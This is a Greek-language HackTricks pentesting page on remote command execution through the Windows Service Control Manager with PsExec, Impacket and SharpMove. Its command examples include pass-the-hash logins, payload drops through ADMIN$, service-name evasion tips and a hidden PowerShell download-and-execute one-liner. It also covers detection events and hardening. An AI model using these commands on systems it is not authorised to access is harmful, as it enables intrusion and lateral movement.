# Remote Service Execution (PsExec, WinExec, ScExec, SMBExec, SCMExec)

{{#include ../../banners/hacktricks-training.md}}

## Πώς λειτουργούν

Αυτές οι τεχνικές κάνουν κατάχρηση του Windows Service Control Manager (SCM) απομακρυσμένα μέσω SMB/RPC για την εκτέλεση εντολών σε έναν υπολογιστή-στόχο. Το Service Control Manager Remote Protocol (SCMR) είναι η διεπαφή που βασίζεται σε RPC για τη ρύθμιση και τον έλεγχο υπηρεσιών των Windows σε απομακρυσμένο υπολογιστή. Με επαρκή δικαιώματα, ένας operator μπορεί να δημιουργήσει ή να επαναρυθμίσει μια υπηρεσία της οποίας η διαδρομή του binary περιλαμβάνει μια εντολή και, στη συνέχεια, να εκκινήσει την υπηρεσία για να την εκτελέσει απομακρυσμένα.<sup>[[5]](#references)</sup> Η συνήθης ροή είναι:

1. Πιστοποιηθείτε στον στόχο μέσω SMB/RPC (TCP/445)· αποκτήστε πρόσβαση στο share ADMIN$ όταν η επιλεγμένη παραλλαγή χρειάζεται να αποθηκεύσει προσωρινά ένα αρχείο ή να ανακτήσει εκεί την έξοδο.
2. Αντιγράψτε ένα εκτελέσιμο ή καθορίστε μια γραμμή εντολών LOLBAS που θα εκτελέσει η υπηρεσία.
3. Δημιουργήστε απομακρυσμένα μια υπηρεσία μέσω SCM (MS-SCMR μέσω \PIPE\svcctl), η οποία θα δείχνει σε αυτήν την εντολή ή το binary.
4. Εκκινήστε την υπηρεσία για να εκτελεστεί το payload και, προαιρετικά, καταγράψτε τα stdin/stdout μέσω ενός named pipe.
5. Διακόψτε την υπηρεσία και κάντε cleanup (διαγράψτε την υπηρεσία και τυχόν binaries που έχουν τοποθετηθεί).

Απαιτήσεις/προαπαιτούμενα:
- Local Administrator στον στόχο (SeCreateServicePrivilege) ή ρητά δικαιώματα δημιουργίας υπηρεσιών στον στόχο.
- Το SMB (445) να είναι προσβάσιμο και το Remote Service Management να επιτρέπεται μέσω του firewall του host· το ADMIN$ πρέπει να είναι διαθέσιμο για τις παραλλαγές που το χρησιμοποιούν για την προσωρινή αποθήκευση ενός αρχείου ή την ανάκτηση εξόδου.
- Περιορισμοί απομακρυσμένης πρόσβασης UAC: με τοπικούς λογαριασμούς, το token filtering μπορεί να αποκλείσει την πρόσβαση διαχειριστή μέσω του δικτύου, εκτός αν χρησιμοποιείται ο ενσωματωμένος λογαριασμός Administrator ή το LocalAccountTokenFilterPolicy=1.
- Kerberos έναντι NTLM: η χρήση hostname/FQDN ενεργοποιεί το Kerberos· η σύνδεση μέσω IP συχνά οδηγεί σε fallback στο NTLM (και ενδέχεται να αποκλειστεί σε περιβάλλοντα με ενισχυμένη ασφάλεια).

Αν δεν καθοριστεί λογαριασμός υπηρεσίας, η `CreateService` χρησιμοποιεί το `LocalSystem`, το οποίο διαθέτει εκτεταμένα τοπικά δικαιώματα. Αυτό εξηγεί τον μεγάλο αντίκτυπο μιας επιτυχημένης εκτέλεσης μέσω SCM. Δεν απενεργοποιεί εγγενώς το UAC ή το Microsoft Defender: ο καλών εξακολουθεί να χρειάζεται απομακρυσμένα δικαιώματα SCM, ενώ τα endpoint controls μπορούν να επιθεωρήσουν ή να αποκλείσουν την υπηρεσία ή το payload.<sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>

### Χειροκίνητο ScExec/WinExec μέσω sc.exe

Ακολουθεί μια ελάχιστη προσέγγιση δημιουργίας υπηρεσίας. Το image της υπηρεσίας μπορεί να είναι ένα EXE που έχει τοποθετηθεί ή ένα LOLBAS όπως το cmd.exe ή το powershell.exe.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Σημειώσεις:
- Αναμένετε σφάλμα timeout κατά την εκκίνηση ενός EXE που δεν είναι service· η εκτέλεση γίνεται κανονικά.
- Για να παραμείνετε πιο OPSEC-friendly, προτιμήστε fileless εντολές (cmd /c, powershell -enc) ή διαγράψτε τα αρχεία που αφήσατε πίσω.

Βρείτε πιο αναλυτικά βήματα στο: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Εργαλεία και παραδείγματα

### Sysinternals PsExec.exe

- Κλασικό εργαλείο διαχείρισης που χρησιμοποιεί SMB για να αποθέσει το PSEXESVC.exe στο ADMIN$, να εγκαταστήσει μια προσωρινή service (με προεπιλεγμένο όνομα PSEXESVC) και να διαμεσολαβήσει το I/O μέσω named pipes.
- Παραδείγματα χρήσης:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Μπορείτε να το εκκινήσετε απευθείας από το Sysinternals Live μέσω WebDAV:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Αφήνει συμβάντα εγκατάστασης/απεγκατάστασης υπηρεσίας (το όνομα της υπηρεσίας είναι συχνά PSEXESVC, εκτός αν χρησιμοποιηθεί το -r) και δημιουργεί το C:\Windows\PSEXESVC.exe κατά την εκτέλεση.

### Impacket psexec.py (τύπου PsExec)

- Χρησιμοποιεί μια ενσωματωμένη υπηρεσία τύπου RemCom. Αποθέτει ένα προσωρινό δυαδικό αρχείο υπηρεσίας (συνήθως με τυχαιοποιημένο όνομα) μέσω του ADMIN$, δημιουργεί μια υπηρεσία (συχνά με προεπιλεγμένο όνομα RemComSvc) και προωθεί την είσοδο/έξοδο μέσω ενός named pipe.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Στο Kali, τα παραδείγματα του Impacket μπορεί να βρίσκονται στον κατάλογο `/usr/share/doc/python3-impacket/examples/`. Αν δεν δοθεί κωδικός πρόσβασης, το εργαλείο ζητά να εισαχθεί. Η επιλογή `-k` του Impacket ζητά έλεγχο ταυτότητας Kerberos αντί για NTLM, χρησιμοποιώντας συνήθως την τρέχουσα cache διαπιστευτηρίων ή διαπιστευτήρια που έχουν δοθεί.

```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p '<password>' # Sysinternals PsExec password authentication
```

Artifacts
- Προσωρινό EXE στο C:\Windows\ (8 τυχαίοι χαρακτήρες). Το όνομα της υπηρεσίας είναι RemComSvc από προεπιλογή, εκτός αν παρακαμφθεί.

### Impacket smbexec.py (SMBExec)

- Δημιουργεί μια προσωρινή υπηρεσία που εκκινεί το cmd.exe και χρησιμοποιεί named pipe για I/O. Γενικά αποφεύγει την απόθεση πλήρους EXE payload· η εκτέλεση εντολών είναι ημι-διαδραστική.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) υλοποιεί διάφορες μεθόδους lateral movement, συμπεριλαμβανομένου του service-based exec.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- Το [SharpMove](https://github.com/0xthirteen/SharpMove) υποστηρίζει απομακρυσμένη εκτέλεση με έλεγχο ταυτότητας μέσω SCM και αρκετών άλλων μηχανισμών των Windows, συμπεριλαμβανομένης της τροποποίησης/δημιουργίας υπηρεσιών.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- Μπορείτε επίσης να χρησιμοποιήσετε το CrackMapExec για εκτέλεση μέσω διαφορετικών backends (psexec/smbexec/wmiexec):

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

#### SCMExec με SharpMove

Η ενέργεια SCM δημιουργεί μια υπηρεσία με όνομα `WindowsDebug` και την κατευθύνει σε ένα payload που βρίσκεται ήδη στον απομακρυσμένο host.<sup>[[6]](#references)</sup>

```powershell
SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```

## OPSEC, εντοπισμός και artifacts

Τυπικά artifacts σε host/network κατά τη χρήση τεχνικών τύπου PsExec:
- Security 4624 (Logon Type 3) και 4672 (Special Privileges) στον target για τον λογαριασμό admin που χρησιμοποιήθηκε.
- Security 5140/5145, συμβάντα File Share και File Share Detailed, που δείχνουν πρόσβαση στο ADMIN$ και δημιουργία/εγγραφή service binaries (π.χ. PSEXESVC.exe ή τυχαίο .exe 8 χαρακτήρων).
- **System** 7045 από το Service Control Manager για εγκατάσταση service στον target: ονόματα όπως PSEXESVC, RemComSvc ή προσαρμοσμένα (`-r` / `-service-name`). Αυτό αποδεικνύει ότι εγκαταστάθηκε ένα service, όχι ότι εκτελέστηκε το image του. Συσχετίστε τη χρονική σήμανση και τη διαδρομή του image με συμβάντα διεργασιών ή με αντίστοιχη καταχώριση prefetch του service image, όταν είναι διαθέσιμη.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) για το services.exe ή το service image, 3 (Network Connect), 11 (File Create) στο C:\Windows\, 17/18 (Pipe Created/Connected) για pipes όπως \\.\pipe\psexesvc, \\.\pipe\remcom_* ή τυχαιοποιημένα ισοδύναμα.
- Artifact μητρώου για το EULA του Sysinternals: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 στον host του operator (αν δεν έχει παραλειφθεί).

Ιδέες για hunting
- Ειδοποίηση για εγκαταστάσεις service όπου το ImagePath περιλαμβάνει cmd.exe /c, powershell.exe ή διαδρομές TEMP.
- Αναζητήστε δημιουργίες διεργασιών όπου το ParentImage είναι C:\Windows\PSEXESVC.exe ή όπου τα παιδιά του services.exe εκτελούνται ως LOCAL SYSTEM και εκτελούν shells.
- Επισημάνετε named pipes που τελειώνουν σε -stdin/-stdout/-stderr ή χρησιμοποιούν γνωστά ονόματα pipe από PsExec clones.

## Αντιμετώπιση συνηθισμένων προβλημάτων
- Access is denied (5) κατά τη δημιουργία services: δεν είστε πραγματικά local admin, ισχύουν περιορισμοί UAC remote για τοπικούς λογαριασμούς ή υπάρχει προστασία EDR από παραποίηση στη διαδρομή του service binary.
- The network path was not found (53) ή αδυναμία σύνδεσης στο ADMIN$: το firewall αποκλείει SMB/RPC ή τα admin shares είναι απενεργοποιημένα.
- Το Kerberos αποτυγχάνει αλλά το NTLM είναι αποκλεισμένο: συνδεθείτε με hostname/FQDN (όχι IP), βεβαιωθείτε ότι υπάρχουν τα κατάλληλα SPNs ή δώστε -k/-no-pass με tickets όταν χρησιμοποιείτε Impacket.
- Υπέρβαση χρονικού ορίου εκκίνησης του service, παρότι εκτελέστηκε το payload: αναμενόμενο αν δεν πρόκειται για πραγματικό service binary· καταγράψτε την έξοδο σε αρχείο ή χρησιμοποιήστε smbexec για live I/O.

## Σημειώσεις hardening
- Τα Windows 11 24H2 και Windows Server 2025 απαιτούν από προεπιλογή SMB signing για εξερχόμενες (και για εισερχόμενες στα Windows 11) συνδέσεις. Αυτό δεν διακόπτει τη νόμιμη χρήση του PsExec με έγκυρα creds, αλλά αποτρέπει την κατάχρηση SMB relay χωρίς υπογραφή και μπορεί να επηρεάσει συσκευές που δεν υποστηρίζουν signing.<sup>[[2]](#references)</sup>
- Ο νέος αποκλεισμός NTLM από το SMB client (Windows 11 24H2/Server 2025) μπορεί να αποτρέψει την εφεδρική χρήση NTLM κατά τη σύνδεση μέσω IP ή σε servers χωρίς Kerberos. Σε περιβάλλοντα με ενισχυμένη ασφάλεια, αυτό θα διακόψει τη χρήση PsExec/SMBExec που βασίζεται σε NTLM· χρησιμοποιήστε Kerberos (hostname/FQDN) ή ρυθμίστε εξαιρέσεις, αν είναι απαραίτητο για νόμιμη χρήση.<sup>[[2]](#references)</sup>
- Αρχή του ελάχιστου προνομίου: περιορίστε τη συμμετοχή στην ομάδα local admin, προτιμήστε Just-in-Time/Just-Enough Admin, επιβάλετε LAPS και παρακολουθείτε/δημιουργήστε alerts για εγκαταστάσεις service 7045.

## Δείτε επίσης

- Απομακρυσμένη εκτέλεση μέσω WMI (συχνά με λιγότερα αρχεία):

{{#ref}}
./wmiexec.md
{{#endref}}

- Απομακρυσμένη εκτέλεση μέσω WinRM:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Ενίσχυση της ασφάλειας SMB στα Windows Server 2025 και Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Χρήση διαπιστευτηρίων για την πλήρη παραβίαση υπολογιστών Windows - Μέρος 2 (PSExec και Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – Αντιμετώπιση απρόσμενων επανεκκινήσεων μέσω των system event logs](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
- [5] [Microsoft Open Specifications - Επισκόπηση του Service Control Manager Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/d5bd5712-fa64-44bf-9433-3651f6a5ce97)
- [6] [GitHub - SharpMove](https://github.com/0xthirteen/SharpMove)
- [7] [Microsoft Learn - Λογαριασμός LocalSystem](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account)
- [8] [Microsoft Learn - Συνάρτηση `CreateService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
{{#include ../../banners/hacktricks-training.md}}
